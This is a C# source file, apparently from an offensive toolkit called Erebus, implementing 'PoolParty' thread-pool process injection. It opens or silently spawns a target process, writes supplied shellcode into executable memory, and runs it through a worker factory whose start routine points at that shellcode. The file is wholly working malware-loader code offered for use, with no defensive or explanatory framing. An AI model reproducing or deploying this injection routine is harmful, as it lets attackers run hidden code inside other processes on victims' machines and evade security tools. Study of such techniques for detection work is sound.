using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class PoolPartyInjection : IInjectionMethod
    {
        public string Name => "PoolParty";
        public string Description => "Thread pool-based remote injection (Worker Factory variant)";

        [StructLayout(LayoutKind.Sequential)]
        private struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtOpenProcess(
            out IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateWorkerFactory(
            out IntPtr WorkerFactoryHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            IntPtr CompletionPortHandle,
            IntPtr WorkerProcessHandle,
            IntPtr StartRoutine,
            IntPtr StartParameter,
            uint MaxThreadCount,
            IntPtr StackReserve,
            IntPtr StackCommit);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtSetInformationWorkerFactory(
            IntPtr WorkerFactoryHandle,
            int WorkerFactoryInformationClass,
            IntPtr WorkerFactoryInformation,
            uint WorkerFactoryInformationLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateIoCompletionPort(
            IntPtr FileHandle,
            IntPtr ExistingCompletionPort,
            IntPtr CompletionKey,
            uint NumberOfConcurrentThreads);

        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint WORKER_FACTORY_ALL_ACCESS = 0xF00FF;
        private const int WorkerFactoryStartRoutine = 1;

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // If no PID specified, create a new process
                IntPtr hProcess;
                int pid;

                if (targetPid == 0)
                {
                    DebugLogger.WriteLine("[+] Creating new target process...");
                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    Win32.PROCESS_INFORMATION pi;

                    bool success = Win32.CreateProcess(
                        null!,
                        InjectionConfig.TargetProcess,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                        IntPtr.Zero,
                        null!,
                        ref si,
                        out pi);

                    if (!success)
                    {
                        DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    hProcess = pi.hProcess;
                    pid = pi.dwProcessId;
                    DebugLogger.WriteLine($"[+] Target process created with PID: {pid}");
                }
                else
                {
                    DebugLogger.WriteLine($"[+] Opening target process PID: {targetPid}");
                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
                    if (hProcess == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }
                    pid = targetPid;
                }

                // Allocate memory in target process
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    (Win32.HANDLE)hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(hProcess);
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
                            (Win32.HANDLE)hProcess,
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
                            Win32.CloseHandle(hProcess);
                            return false;
                        }

                        DebugLogger.WriteLine($"[+] Written {written} bytes to target process");
                    }
                }

                // Create IO Completion Port
                IntPtr hPort = CreateIoCompletionPort(
                    new IntPtr(-1),
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0);

                if (hPort == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] CreateIoCompletionPort failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(hProcess);
                    return false;
                }

                DebugLogger.WriteLine("[+] IO Completion Port created");

                // Create Worker Factory
                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
                oa.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));

                IntPtr hWorkerFactory;
                uint status = NtCreateWorkerFactory(
                    out hWorkerFactory,
                    WORKER_FACTORY_ALL_ACCESS,
                    ref oa,
                    hPort,
                    hProcess,
                    baseAddress,  // Start routine points to our shellcode
                    IntPtr.Zero,
                    1,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtCreateWorkerFactory failed with NTSTATUS: 0x{status:X}");
                    Win32.CloseHandle(hPort);
                    Win32.CloseHandle(hProcess);
                    return false;
                }

                DebugLogger.WriteLine("[+] Worker Factory created");

                // Trigger worker thread creation by setting information
                status = NtSetInformationWorkerFactory(
                    hWorkerFactory,
                    WorkerFactoryStartRoutine,
                    baseAddress,
                    (uint)IntPtr.Size);

                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] NtSetInformationWorkerFactory failed with NTSTATUS: 0x{status:X}");
                }

                DebugLogger.WriteLine("[+] PoolParty injection completed successfully");

                // Cleanup
                Win32.CloseHandle(hWorkerFactory);
                Win32.CloseHandle(hPort);
                Win32.CloseHandle(hProcess);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] PoolParty injection failed: {ex.Message}");
                return false;
            }
        }
    }
}
